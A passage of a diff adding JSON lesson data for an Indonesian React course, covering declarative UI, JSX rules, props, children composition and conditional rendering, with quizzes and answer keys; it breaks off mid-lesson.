+            "definition": "Blok bangunan UI modular, terisolasi, dan dapat digunakan kembali yang mengembalikan elemen visual (JSX)."
+          },
+          {
+            "term": "Virtual DOM",
+            "definition": "Representasi ringan dari DOM asli di memori tempat React menghitung perbedaan (diffing) sebelum menyentuh browser DOM nyata."
+          }
+        ],
+        "contentMd": "# Arsitektur Komponen & Paradigma Declarative UI\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fondasi filosofi **React**: pergeseran revolusioner dari **Imperative DOM** ke **Declarative UI**, rumus dasar **`UI = f(state)`**, serta cara kerja **Virtual DOM** dan proses rekonsiliasi.\n\n## Mengapa Konsep Ini Penting?\nDi JavaScript murni (Imperatif), jika sebuah data berubah, Anda harus menulis: *\"Cari elemen tombol, ubah teksnya, ubah warna border-nya, lalu tambahkan class baru\"*. Jika aplikasi memiliki 100 interaksi, kode menjadi sangat rumit dan rawan error. React mengubah cara berpikir kita menjadi Deklaratif: cukup tentukan bentuk akhir UI sesuai datanya.\n\n## 1. Imperative vs Declarative UI\n\n```text\nPENDEKATAN IMPERATIF (JavaScript Kuno)\n\"Bagaimana cara melakukannya langkah demi langkah?\"\n1. Cari elemen: document.getElementById(\"btn\")\n2. Ubah isi teks: btn.textContent = \"Loading...\"\n3. Tambah class: btn.classList.add(\"disabled\")\n4. Kunci atribut: btn.setAttribute(\"disabled\", \"true\")\n\nPENDEKATAN DEKLARATIF (React Modern)\n\"Seperti apa tampilan UI berdasarkan kondisi state saat ini?\"\n<button disabled={isLoading}>\n  {isLoading ? \"Loading...\" : \"Kirim Data\"}\n</button>\n```\n\n## 2. Rumus Inti React: `UI = f(state)`\nDi React: **Tampilan Antarmuka (UI) adalah fungsi murni dari State (Data)**.\n- Ketika data/state berubah, React secara otomatis menghitung ulang dan memperbarui tampilan visual tanpa Anda perlu memanipulasi DOM sebaris pun!\n\n## 3. Apa itu Virtual DOM & Rekonsiliasi?\nMenyentuh DOM browser asli secara berulang-ulang sangat lambat bagi performa komputer.\n1. **Virtual DOM**: Salinan representasi ringan pohon DOM yang disimpan di memori JavaScript.\n2. **Diffing Algorithm**: Saat state berubah, React membandingkan Virtual DOM baru dengan Virtual DOM lama (*Diffing*).\n3. **Reconciliation (Batch Update)**: React **hanya memperbarui elemen yang benar-benar berubah saja** ke DOM browser asli secara efisien dalam satu kedipan mata.\n\n## Kesalahan Umum Pemula\n- **Memanipulasi DOM Langsung di React**: Menulis `document.getElementById(\"judul\").innerText = \"Halo\"` di dalam komponen React. Hindari ini! Selalu biarkan React mengelola DOM melalui State.\n\n## Praktik Mandiri\n1. Analisis antarmuka website favorit Anda (misal kartu postingan Twitter/X).\n2. Pecah halaman tersebut menjadi komponen modular: `Header`, `Avatar`, `PostContent`, `ActionBar`, `LikeButton`.\n\n## Ringkasan\n- **Declarative UI** mendeskripsikan hasil akhir tampilan berdasarkan kondisi data (*state*).\n- Rumus inti: **`UI = f(state)`**.\n- **Virtual DOM** membandingkan perbedaan (*diffing*) dan hanya memperbarui elemen yang berubah ke DOM asli untuk performa tinggi.",
+        "quizzes": [
+          {
+            "id": "q-12-1-1",
+            "question": "Apa perbedaan paling mendasar antara paradigma pemrograman Imperatif dan Deklaratif dalam pembangunan UI?",
+            "options": [
+              "Imperatif mendikte instruksi langkah demi langkah bagaimana memanipulasi DOM, sedangkan Deklaratif mendeskripsikan seperti apa bentuk tampilan UI seharusnya berdasarkan data/state saat ini.",
+              "Imperatif hanya untuk mobile sedangkan Deklaratif hanya untuk desktop.",
+              "Deklaratif tidak mendukung styling CSS.",
+              "Imperatif dieksekusi lebih cepat daripada Deklaratif."
+            ],
+            "correctIndex": 0,
+            "explanation": "Declarative UI memusatkan logika pada representasi status data, membebaskan developer dari keharusan menulis langkah mutasi DOM manual."
+          },
+          {
+            "id": "q-12-1-2",
+            "question": "Bagaimana cara kerja Virtual DOM dan proses Rekonsiliasi (Diffing) di dalam React?",
+            "options": [
+              "React membuat representasi Virtual DOM di memori, membandingkan perubahannya dengan versi sebelumnya (diffing), dan hanya menerapkan patch perubahan spesifik tersebut ke DOM browser asli.",
+              "React menghapus seluruh halaman HTML dan memuat ulang website dari nol di setiap klik.",
+              "Virtual DOM menyimpan seluruh data website ke harddisk pengguna.",
+              "Virtual DOM menggantikan fungsi database backend."
+            ],
+            "correctIndex": 0,
+            "explanation": "Virtual DOM mengoptimalkan render performance dengan menghitung delta perbedaan di memori dan meminimalkan operasi berat pada browser real DOM."
+          },
+          {
+            "id": "q-12-1-3",
+            "question": "Apa arti dari rumus filosofis React: UI = f(state)?",
+            "options": [
+              "Tampilan antarmuka pengguna (UI) adalah hasil keluaran langsung yang dipetakan secara deterministik dari kondisi data (state) aplikasi saat itu.",
+              "UI harus dihitung menggunakan kalkulus integral.",
+              "State tidak boleh memiliki nilai teks.",
+              "Komponen UI harus ditulis dalam satu baris fungsi."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip ini menegaskan bahwa perubahan tampilan visual murni dipicu oleh perubahan state data yang mengaliri fungsi komponen."
+          }
+        ]
+      },
+      {
+        "id": "lesson-12-2",
+        "stageId": "stage-12",
+        "slug": "jsx-tsx-sintaks-dan-aturan-dasar",
+        "title": "JSX / TSX: Sintaks, Aturan & Perbedaan dengan HTML",
+        "titleEn": "JSX / TSX Syntax & Rules",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menulis JavaScript XML (JSX/TSX), aturan Single Root Element (<React.Fragment> / <>), penutupan tag mandiri (self-closing), penamaan atribut (className, htmlFor, camelCase), dan interpolasi kurung kurawal {}.",
+        "prerequisites": [
+          "arsitektur-komponen-dan-declarative-ui"
+        ],
+        "learningObjectives": [
+          "Menjelaskan bahwa JSX adalah ekstensi sintaksis JavaScript yang ditranspilasi menjadi panggilan fungsi React.createElement.",
+          "Menerapkan 3 aturan baku JSX: Single Root Element (<>), Self-Closing tags, dan camelCase attributes (className, htmlFor).",
+          "Menyematkan ekspresi logika JavaScript ke dalam markup menggunakan kurung kurawal `{}`."
+        ],
+        "whyMatters": "JSX menggabungkan kekuatan penuh logika JavaScript dengan kemudahan menulis struktur markup HTML di satu tempat.",
+        "careerContext": "Setiap komponen frontend di ekosistem React dan Next.js ditulis menggunakan sintaks TSX/JSX.",
+        "commonMistakes": [
+          "Menulis atribut `class` alih-alih `className`, atau `for` alih-alih `htmlFor` (karena `class` dan `for` adalah reserved keywords di JavaScript).",
+          "Mengembalikan dua elemen bertetangga tanpa elemen pembungkus root Fragment `<> ... </>`."
+        ],
+        "keyTerms": [
+          {
+            "term": "JSX (JavaScript XML)",
+            "definition": "Ekstensi sintaksis mirip HTML yang memungkinkan penulisan markup langsung di dalam file JavaScript/TypeScript."
+          },
+          {
+            "term": "React Fragment (<>...</>)",
+            "definition": "Komponen pembungkus transparan tanpa menghasilkan elemen DOM ekstra di HTML akhir."
+          },
+          {
+            "term": "className",
+            "definition": "Atribut JSX penentu kelas CSS (pengganti atribut `class` pada HTML standar)."
+          }
+        ],
+        "contentMd": "# JSX / TSX: Sintaks, Aturan & Perbedaan dengan HTML\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **JSX (JavaScript XML)** dan **TSX (TypeScript JSX)**: ekstensi sintaks yang memungkinkan Anda menulis markup seperti HTML langsung di dalam fungsi JavaScript, 3 aturan wajib JSX, dan penggunaan **React Fragment (`<>`)**.\n\n## Mengapa Konsep Ini Penting?\nSebelum adanya JSX, membuat elemen HTML di JavaScript sangat menyakitkan:\n```javascript\n// Tanpa JSX:\nReact.createElement('button', { className: 'btn-beli' }, 'Beli Sekarang');\n\n// Dengan JSX (Sangat Intuitif & Mudah Dibaca!):\n<button className=\"btn-beli\">Beli Sekarang</button>\n```\n\n## 1. Tiga (3) Aturan Wajib JSX\n\n### Aturan 1: Wajib Mengembalikan Satu Elemen Root Tunggal (Single Root)\nKomponen React hanya boleh mengembalikan **1 elemen pembungkus terluar**. Jika Anda memiliki dua elemen berdampingan, bungkus menggunakan **React Fragment (`<> ... </>`)**:\n\n```tsx\n// SALAH (Melempar SyntaxError):\n// return (\n//   <h1>Judul</h1>\n//   <p>Deskripsi</p>\n// );\n\n// BENAR (Menggunakan Fragment Tanpa Menambah Tag Div Ekstra):\nreturn (\n  <>\n    <h1>Judul</h1>\n    <p>Deskripsi</p>\n  </>\n);\n```\n\n### Aturan 2: Seluruh Tag Wajib Ditutup (Self-Closing)\nDi HTML biasa, tag seperti `<img>` atau `<input>` boleh tidak ditutup. Di JSX, seluruh tag mandiri **WAJIB diakhiri garis miring penutup (`/>`)**:\n\n```tsx\n<img src=\"/avatar.jpg\" alt=\"Foto Profil\" />\n<input type=\"text\" placeholder=\"Ketik nama...\" />\n<br />\n```\n\n### Aturan 3: Penamaan Atribut Menggunakan camelCase\nKarena JSX hidup di dalam file JavaScript, beberapa kata kunci bawaan HTML harus diganti:\n- `class` $\\rightarrow$ ganti menjadi **`className`** (karena `class` adalah kata kunci class OOP di JS).\n- `for` pada label $\\rightarrow$ ganti menjadi **`htmlFor`**.\n- Atribut inline style menggunakan objek: `style={{ color: 'red', marginTop: '10px' }}`.\n\n## 2. Menyematkan Ekspresi JavaScript dengan Kurung Kurawal `{}`\nApapun yang berada di dalam tanda kurung kurawal **`{ ... }`** di JSX akan dievaluasi sebagai kode JavaScript murni:\n\n```tsx\nexport function ProfilCard() {\n  const nama = \"Acelino\";\n  const usia = 24;\n  const foto = \"/avatar.png\";\n\n  return (\n    <div className=\"kartu\">\n      <img src={foto} alt={nama} />\n      <h3>{nama.toUpperCase()}</h3>\n      <p>Usia: {usia} tahun</p>\n      <p>Status: {usia >= 18 ? \"Dewasa\" : \"Remaja\"}</p>\n    </div>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memasukkan blok statement if di dalam JSX kurung kurawal**: Kurung kurawal `{}` hanya menerima **Expression** (yang menghasilkan nilai, seperti ternary `? :`), bukan Statement (`if (...) { }`).\n\n## Praktik Mandiri\n1. Buat komponen fungsional sederhana `BannerPromo` yang menampilkan judul, gambar dengan self-closing tag, dan tombol dengan class `btn-primary`.\n\n## Ringkasan\n- **JSX** adalah ekstensi sintaksis deklaratif yang menggabungkan logika JavaScript dan struktur HTML.\n- Wajib memiliki **1 Root Element** (gunakan Fragment `<> ... </>`).\n- Seluruh tag wajib ditutup rapi (**`<img />`**).\n- Gunakan **`className`** dan **`htmlFor`**.\n- Sisipkan logika dinamis di dalam kurung kurawal **`{ ekspresi }`**.",
+        "quizzes": [
+          {
+            "id": "q-12-2-1",
+            "question": "Mengapa atribut penentu kelas CSS pada elemen JSX wajib ditulis sebagai className alih-alih class seperti pada HTML standar?",
+            "options": [
+              "Karena kata kunci 'class' adalah reserved keyword resmi di bahasa pemrograman JavaScript untuk deklarasi Object-Oriented Class.",
+              "Karena className memproses animasi lebih cepat.",
+              "Karena konsorsium HTML5 melarang kata class.",
+              "Agar browser mengenali warna stylesheet secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Karena JSX adalah ekstensi JavaScript murni, identifier class telah dicadangkan untuk sintaks class OOP JS sehingga digunakan atribut className."
+          },
+          {
+            "id": "q-12-2-2",
+            "question": "Apa fungsi dari React Fragment (<> ... </>) saat mengembalikan struktur elemen dari sebuah komponen React?",
+            "options": [
+              "Memenuhi aturan wajib single root element tanpa menambahkan node elemen DOM pembungkus ekstra (seperti div) yang tidak perlu di halaman HTML akhir.",
+              "Mengubah seluruh teks di dalamnya menjadi huruf miring.",
+              "Menghapus seluruh file gambar pada website.",
+              "Menghentikan eksekusi kode JavaScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "React Fragments mengelompokkan daftar elemen anak tanpa membuang node pembungkus tambahan ke dalam DOM tree browser."
+          },
+          {
+            "id": "q-12-2-3",
+            "question": "Manakah penulisan elemen input dan gambar yang benar dan memenuhi spesifikasi aturan penutupan tag JSX/TSX?",
+            "options": [
+              "<input type=\"text\" /> dan <img src=\"/logo.png\" alt=\"Logo\" />",
+              "<input type=\"text\"> dan <img src=\"/logo.png\" alt=\"Logo\">",
+              "<input>...</input> dan <img:source>",
+              "<input type=\"text\" close>"
+            ],
+            "correctIndex": 0,
+            "explanation": "JSX mewajibkan seluruh tag elemen tunggal (void elements) ditutup secara eksplisit dengan tanda self-closing />."
+          }
+        ]
+      },
+      {
+        "id": "lesson-12-3",
+        "stageId": "stage-12",
+        "slug": "komponen-fungsional-dan-props",
+        "title": "Komponen Fungsional & Props (Unidirectional Data Flow)",
+        "titleEn": "Functional Components & Props",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Membuat Functional Components dengan TypeScript, mengirim dan menerima Props, Read-Only Props (Immutability), dan Unidirectional Data Flow (aliran data satu arah parent-to-child).",
+        "prerequisites": [
+          "jsx-tsx-sintaks-dan-aturan-dasar"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan Functional Components yang menerima typed Props interface di TypeScript.",
+          "Menjelaskan konsep Unidirectional Data Flow: data mengalir satu arah dari Parent ke Child.",
+          "Menjelaskan bahwa Props bersifat Read-Only (Immutable) dan tidak boleh dimutasi oleh komponen penerima.",
+          "Menerapkan Destructuring dan Default Values pada parameter Props komponen."
+        ],
+        "whyMatters": "Props adalah mekanisme utama pertukaran data antar komponen yang membuat arsitektur UI dapat dikomposisi secara modular dan terprediksi.",
+        "careerContext": "Membuat reusable components dengan typing props yang ketat adalah aktivitas harian utama frontend developer.",
+        "commonMistakes": [
+          "Mencoba mengubah nilai props secara langsung di dalam komponen anak (`props.title = 'baru'` yang melanggar aturan immutability React).",
+          "Lupa memberikan tipe TypeScript pada props komponen."
+        ],
+        "keyTerms": [
+          {
+            "term": "Props (Properties)",
+            "definition": "Argumen data input yang dikirimkan oleh komponen Parent ke komponen Child."
+          },
+          {
+            "term": "Unidirectional Data Flow",
+            "definition": "Prinsip arsitektur di mana data selalu mengalir satu arah dari atas ke bawah (Top-Down)."
+          },
+          {
+            "term": "Read-Only / Pure Function",
+            "definition": "Sifat komponen yang tidak boleh mengubah input props yang diterimanya."
+          }
+        ],
+        "contentMd": "# Komponen Fungsional & Props (Unidirectional Data Flow)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara membuat **Functional Components** modular, mendefinisikan kontrak **TypeScript Props**, prinsip **Unidirectional Data Flow (Aliran Data Satu Arah)**, serta sifat **Immutability Props (Read-Only)**.\n\n## Mengapa Konsep Ini Penting?\nSama seperti fungsi matematika `f(x) = x + 2` menerima argumen `x`, komponen React menerima argumen bernama **`Props`**. Satu komponen tombol yang sama dapat memiliki warna, ukuran, dan teks yang berbeda di seluruh aplikasi hanya dengan mengubah nilai Props yang dikirimkan.\n\n## 1. Komponen Fungsional dengan TypeScript Props\n\n```tsx\n// 1. Definisikan Kontrak Bentuk Props dengan Interface:\ninterface TombolProps {\n  label: string;\n  varian?: \"primer\" | \"sekunder\" | \"bahaya\"; // Opsional\n  apakahDisable?: boolean;                    // Opsional\n  onKlik: () => void;                         // Fungsi Callback\n}\n\n// 2. Tulis Komponen Fungsional dengan Destructuring & Nilai Default:\nexport function TombolKustom({\n  label,\n  varian = \"primer\",\n  apakahDisable = false,\n  onKlik\n}: TombolProps) {\n  return (\n    <button\n      disabled={apakahDisable}\n      onClick={onKlik}\n      className={`btn btn-${varian}`}\n    >\n      {label}\n    </button>\n  );\n}\n```\n\n## 2. Mengirim Props dari Komponen Parent\n\n```tsx\nexport function HalamanUtama() {\n  return (\n    <main>\n      <h1>Dashboard BelajarinAja</h1>\n      \n      {/* Menggunakan kembali komponen dengan props berbeda: */}\n      <TombolKustom \n        label=\"Daftar Sekarang\" \n        varian=\"primer\" \n        onKlik={() => console.log(\"Daftar!\")} \n      />\n\n      <TombolKustom \n        label=\"Hapus Akun\" \n        varian=\"bahaya\" \n        onKlik={() => console.log(\"Hapus!\")} \n      />\n    </main>\n  );\n}\n```\n\n## 3. Prinsip Emas: Unidirectional Data Flow & Read-Only Props\n1. **Data Mengalir Satu Arah (Top-Down)**: Data selalu mengalir dari **Parent $\\rightarrow$ Child**. Komponen anak tidak bisa mengubah data parent secara langsung (hanya bisa memicu event callback yang diberikan parent).\n2. **Props Bersifat Read-Only (Immutable)**: Komponen anak **DILARANG KERAS** mengubah nilai props-nya sendiri:\n```tsx\n// SANGAT DILARANG (Memicu Bug Fatal di React):\nfunction Kartu(props: { judul: string }) {\n  // props.judul = \"Judul Baru\"; // ERROR MUTASI PROPS!\n}\n```\n\n## Kesalahan Umum Pemula\n- **Mencoba mutasi props langsung**: Jika Anda ingin data di dalam komponen bisa berubah nilainya saat berinteraksi, gunakan **`State` (useState)**, bukan Props!\n\n## Praktik Mandiri\n1. Buat komponen `BadgeStatus` yang menerima props `status: 'sukses' | 'gagal' | 'pending'` dan `pesan: string`.\n2. Tampilkan badge dengan warna background berbeda sesuai statusnya.\n\n## Ringkasan\n- **Functional Components** menerima data input melalui **Props**.\n- Selalu buat interface **TypeScript** untuk mendokumentasikan tipe props secara ketat.\n- Data mengalir satu arah (**Unidirectional Data Flow**) dari Parent ke Child.\n- **Props bersifat Read-Only (Immutable)** dan tidak boleh diubah oleh komponen penerima.",
+        "quizzes": [
+          {
+            "id": "q-12-3-1",
+            "question": "Apa sifat dasar dari 'Props' yang diterima oleh sebuah komponen anak (child component) di React?",
+            "options": [
+              "Props bersifat Read-Only (Immutable); komponen anak dilarang keras mengubah atau memutasi nilai props yang diterimanya.",
+              "Props bebas diubah nilainya oleh komponen anak kapan saja.",
+              "Props otomatis disimpan ke database cloud.",
+              "Props hanya bisa bertipe data string teks."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip kemurnian React (pure component) menetapkan bahwa komponen tidak boleh mengubah nilai input props-nya sendiri demi prediktabilitas render."
+          },
+          {
+            "id": "q-12-3-2",
+            "question": "Apa yang dimaksud dengan prinsip 'Unidirectional Data Flow' dalam arsitektur React?",
+            "options": [
+              "Data selalu mengalir satu arah dari atas ke bawah, dari komponen Parent menuju ke komponen Child melalui Props.",
+              "Data mengalir bebas ke segala arah tanpa aturan hierarki.",
+              "Data hanya mengalir dari browser ke server backend.",
+              "Data hanya bisa dibaca oleh satu baris kode saja."
+            ],
+            "correctIndex": 0,
+            "explanation": "Aliran data satu arah (top-down) memastikan struktur data hierarkis mudah dilacak sumber kebenarannya (single source of truth)."
+          },
+          {
+            "id": "q-12-3-3",
+            "question": "Manakah cara terbaik menerima dan memberikan nilai default pada props komponen di TypeScript modern?",
+            "options": [
+              "Menggunakan Object Destructuring langsung pada parameter fungsi (contoh: function Card({ title, variant = 'primary' }: CardProps) { ... })",
+              "Menggunakan querySelector di dalam fungsi.",
+              "Menuliskan props di file CSS terpisah.",
+              "Menggunakan perulangan while."
+            ],
+            "correctIndex": 0,
+            "explanation": "Destructuring parameter dengan nilai default adalah standar ES6/TypeScript terbersih untuk mengekstrak dan memberi fallback pada props."
+          }
+        ]
+      },
+      {
+        "id": "lesson-12-4",
+        "stageId": "stage-12",
+        "slug": "children-prop-dan-komposisi-komponen",
+        "title": "Children Prop & Komposisi Komponen",
+        "titleEn": "Children Prop & Component Composition",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memanfaatkan prop spesial `children` (React.ReactNode) untuk membuat komponen kontainer (Card, Modal, Layout Shell) dan prinsip Komposisi vs Pewarisan.",
+        "prerequisites": [
+          "komponen-fungsional-dan-props"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan tipe prop spesial `children: React.ReactNode` di TypeScript.",
+          "Membangun komponen kontainer generik (seperti Card pembungkus, Modal Dialog, atau Layout Shell).",
+          "Menerapkan prinsip Komposisi Komponen (Composition over Inheritance) dalam arsitektur React."
+        ],
+        "whyMatters": "Komposisi komponen via `children` mencegah prop-drilling yang berlebihan dan membuat komponen UI seperti Kotak Dialog atau Card sangat fleksibel menampung konten apapun.",
+        "careerContext": "Seluruh design system modern (Shadcn UI, Radix, Tailwind UI) dibangun menggunakan prinsip Komposisi berbasis `children`.",
+        "commonMistakes": [
+          "Membuat 10 props terpisah (seperti `headerText`, `bodyText`, `footerText`) pada Card alih-alih menggunakan `children` yang fleksibel.",
+          "Lupa menyertakan tipe `children: React.ReactNode` pada interface TypeScript."
+        ],
+        "keyTerms": [
+          {
+            "term": "children",
+            "definition": "Prop bawaan otomatis React yang menampung elemen JSX apapun yang disisipkan di antara tag pembuka dan penutup komponen."
+          },
+          {
+            "term": "React.ReactNode",
+            "definition": "Tipe TypeScript komprehensif yang mencakup seluruh hal yang dapat dirender React (JSX, string, number, null, array)."
+          },
+          {
+            "term": "Composition",
+            "definition": "Pola arsitektur menyusun komponen besar dari penggabungan beberapa komponen kecil yang independen."
+          }
+        ],
+        "contentMd": "# Children Prop & Komposisi Komponen\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari prop spesial bawaan React: **`children`** (bertipe **`React.ReactNode`**), cara membuat komponen pembungkus kontainer (**Layout Wrapper**, **Modal**, **Card**), serta filosofi **Komposisi Komponen (*Composition over Inheritance*)**.\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara membuat komponen `<Modal>` atau `<Card>` yang bisa menampung teks formulir login di satu tempat, dan menampung galeri foto produk di tempat lain? Anda tidak perlu membuat dua komponen terpisah. Prop `children` bertindak sebagai \"slot konten kosong\" yang fleksibel.\n\n## 1. Mengenal Prop Spesial: `children`\nApapun konten JSX yang Anda letakkan **di antara tag pembuka dan penutup komponen** akan otomatis dikirimkan ke dalam prop bernama `children`:\n\n```tsx\n// Komponen Kontainer Pembungkus:\ninterface CardProps {\n  judul: string;\n  children: React.ReactNode; // Tipe TypeScript untuk elemen anak apapun\n}\n\nexport function Card({ judul, children }: CardProps) {\n  return (\n    <div className=\"border rounded-lg shadow-md p-6 bg-white\">\n      <h2 className=\"text-xl font-bold border-b pb-2 mb-4\">{judul}</h2>\n      \n      {/* SLOT KONTEN DINAMIS DIMASUKKAN DI SINI: */}\n      <div className=\"konten-isi\">\n        {children}\n      </div>\n    </div>\n  );\n}\n```\n\n## 2. Menggunakan Komponen Kontainer di Berbagai Kasus\n\n```tsx\nexport function Dashboard() {\n  return (\n    <div className=\"grid grid-cols-2 gap-4\">\n      {/* Kasus 1: Mengisi Card dengan Formulir */}\n      <Card judul=\"Ganti Password\">\n        <form>\n          <input type=\"password\" placeholder=\"Password baru\" />\n          <button type=\"submit\">Simpan</button>\n        </form>\n      </Card>\n\n      {/* Kasus 2: Mengisi Card yang SAMA dengan Teks Artikel */}\n      <Card judul=\"Pengumuman Penting\">\n        <p>BelajarinAja versi 2.0 telah resmi diluncurkan!</p>\n        <span className=\"badge\">Update Baru</span>\n      </Card>\n    </div>\n  );\n}\n```\n\n## 3. Filosofi Komposisi vs Pewarisan (Composition over Inheritance)\nReact secara resmi menyarankan untuk **tidak pernah menggunakan pewarisan kelas (*Class Inheritance* / `extends`)** untuk komponen UI. Gunakan selalu **Komposisi**: susun komponen kecil seperti menyusun balok lego untuk membentuk komponen yang lebih besar dan fleksibel.\n\n## Kesalahan Umum Pemula\n- **Memberi tipe `string` pada children**: Menggunakan `children: string` akan membuat komponen error jika anak yang dimasukkan adalah tag `<div>` atau komponen lain. Selalu gunakan **`React.ReactNode`**.\n\n## Praktik Mandiri\n1. Buat komponen `Container` dengan pembatas lebar `max-w-4xl mx-auto px-4` yang menerima `children: React.ReactNode`.\n2. Gunakan untuk membungkus halaman profil Anda.\n\n## Ringkasan\n- **`children`** adalah prop otomatis untuk menangkap isi konten di antara tag pembuka dan penutup.\n- Gunakan tipe TypeScript **`React.ReactNode`** untuk prop `children`.\n- **Komposisi Komponen** membuat komponen kontainer (*Card, Dialog, Layout*) dapat digunakan kembali secara tak terbatas.",
+        "quizzes": [
+          {
+            "id": "q-12-4-1",
+            "question": "Apa fungsi dari prop bawaan spesial 'children' pada komponen React?",
+            "options": [
+              "Menampung dan merender elemen JSX apa pun yang disisipkan di antara tag pembuka dan penutup komponen tersebut (<Component>isi children</Component>).",
+              "Menghubungkan komponen ke akun email anak pengguna.",
+              "Menghapus komponen secara otomatis setelah 5 detik.",
+              "Memperkecil ukuran font teks di layar."
+            ],
+            "correctIndex": 0,
+            "explanation": "children adalah prop bawaan React yang bertindak sebagai slot fleksibel untuk menampung konten bersarang apapun di dalam komponen."
+          },
+          {
+            "id": "q-12-4-2",
+            "question": "Tipe TypeScript manakah yang paling komprehensif dan tepat digunakan untuk mendefinisikan prop children pada komponen React modern?",
+            "options": [
+              "React.ReactNode",
+              "string",
+              "number",
+              "HTMLElement"
+            ],
+            "correctIndex": 0,
+            "explanation": "React.ReactNode mencakup seluruh hal yang sah dirender oleh React: elemen JSX, string, number, fragment, portal, null, dan undefined."
+          },
+          {
+            "id": "q-12-4-3",
+            "question": "Dalam arsitektur perancangan komponen antarmuka pengguna React, apa yang dimaksud dengan prinsip 'Composition over Inheritance'?",
+            "options": [
+              "Menyusun komponen kompleks dengan menggabungkan dan membungkus komponen-komponen kecil yang modular via Props/Children, bukan membuat hierarki pewarisan class yang kaku.",
+              "Mewajibkan penggunaan class inheritance berjenjang 5 tingkat.",
+              "Melarang penggunaan komponen fungsional.",
+              "Menghapus semua file JavaScript."
+            ],
+            "correctIndex": 0,
+            "explanation": "Komposisi balok-lego (composition) memberikan fleksibilitas jauh lebih tinggi dibanding pewarisan inheritance klasik dalam desain antarmuka web."
+          }
+        ]
+      },
+      {
+        "id": "lesson-12-5",
+        "stageId": "stage-12",
+        "slug": "conditional-rendering-ternary-logical-and",
+        "title": "Conditional Rendering (Ternary, Logical &&, Early Return)",
+        "titleEn": "Conditional Rendering Patterns",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menampilkan UI berdasarkan kondisi data: Ternary Operator (? :), Logical AND (&&) dan jebakan angka 0, serta pola Early Return untuk status Loading/Error.",
+        "prerequisites": [
+          "children-prop-dan-komposisi-komponen"
+        ],
+        "learningObjectives": [
+          "Menerapkan 3 pola Conditional Rendering: Ternary Operator, Logical AND (&&), dan Early Return.",
+          "Mendiagnosis dan mencegah jebakan angka 0 pada Logical AND (`items.length && <List />` yang mencetak angka 0 di layar).",
+          "Menyusun tampilan skeleton/loading dan error state menggunakan pola Early Return."
+        ],
+        "whyMatters": "Antarmuka modern selalu dinamis: menampilkan indikator loading saat memuat data, pesan error saat gagal, dan konten utama saat sukses.",
+        "careerContext": "Menghindari rendering angka `0` tak sengaja di JSX adalah tanda kematangan pemahaman teknis React.",
+        "commonMistakes": [
+          "Menulis `{items.length && <List />}` saat `items` kosong, yang menyebabkan angka `0` tercetak mengotori tampilan layar pengguna (karena `0` adalah nilai falsy numerik yang tetap dirender oleh React).",
+          "Menulis blok `if-else` panjang di dalam JSX kurung kurawal (gunakan ternary atau early return)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Conditional Rendering",
+            "definition": "Teknik merender elemen atau komponen visual yang berbeda berdasarkan kondisi logika tertentu."
+          },
+          {
+            "term": "Early Return",
+            "definition": "Pola mengembalikan JSX lebih awal di puncak fungsi komponen jika kondisi khusus (seperti loading/error) terpenuhi."
+          },
+          {
+            "term": "Zero Falsy Pitfall",
+            "definition": "Jebakan di mana angka `0` pada operator `0 && <Component />` dirender oleh React menjadi teks angka 0 di layar."
+          }
+        ],
+        "contentMd": "# Conditional Rendering (Ternary, Logical &&, Early Return)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari 3 pola **Conditional Rendering (Penampilan Kondisional)** di React: **Ternary Operator**, **Logical AND (`&&`)**, bahaya jebakan **angka 0**, serta pola **Early Return**.\n\n## Mengapa Konsep Ini Penting?\nHalaman web tidak selalu menampilkan hal yang sama. Jika data masih diunduh, tampilkan animasi *Loading Spinner*; jika terjadi error, tampilkan *Pesan Error*; jika pengguna belum berlangganan, tampilkan tombol *Upgrade Akun*.\n\n## 1. Tiga Pola Conditional Rendering Utama\n\n### A. Pola 1: Early Return (Sangat Bagus untuk Loading / Error)\nKeluarkan (*return*) tampilan khusus di awal fungsi komponen sebelum merender konten utama:\n\n```tsx\nexport function ProfilUser({ isLoading, error, user }: ProfilProps) {\n  // 1. Jika masih loading, return indikator loading:\n  if (isLoading) {\n    return <div className=\"spinner\">Memuat data profil...</div>;\n  }\n\n  // 2. Jika terjadi error, return pesan error:\n  if (error) {\n    return <div className=\"text-red-500\">Terjadi kesalahan: {error}</div>;\n  }\n\n  // 3. Jika aman, render konten utama:\n  return (\n    <div>\n      <h1>Selamat Datang, {user.nama}!</h1>\n    </div>\n  );\n}\n```\n\n### B. Pola 2: Ternary Operator (`kondisi ? benar : salah`)\nGunakan saat Anda memiliki dua alternatif tampilan yang saling bergantian:\n\n```tsx\n<div>\n  {isLoggedIn ? (\n    <button onClick={handleLogout}>Keluar Akun</button>\n  ) : (\n    <button onClick={handleLogin}>Masuk Akun</button>\n  )}\n</div>\n```\n\n### C. Pola 3: Logical AND (`&&` - Tampilkan Jika Benar Saja)\nGunakan saat Anda hanya ingin menampilkan elemen jika kondisinya `true` (jika salah, tidak menampilkan apa-apa):\n\n```tsx\n<div>\n  <h1>Pemberitahuan</h1>\n  {adaPesanBaru && <span className=\"badge-merah\">Pesan Baru!</span>}\n</div>\n```\n\n## 2. Jebakan Fatal: Angka Nol (`0`) pada Operator `&&`\nPerhatikan kode berbahaya ini:\n```tsx\n// JANGAN LAKUKAN INI:\nconst daftarItem = []; // length = 0\n\nreturn (\n  <div>\n    {/* BAHAYA: Karena length bernilai 0, React akan MENAMPILKAN ANGKA \"0\" DI LAYAR! */}\n    {daftarItem.length && <ItemListView items={daftarItem} />}\n  </div>\n);\n```\n\n### Solusi Benar (Ubah menjadi Boolean sejati):\n```tsx\n// CARA 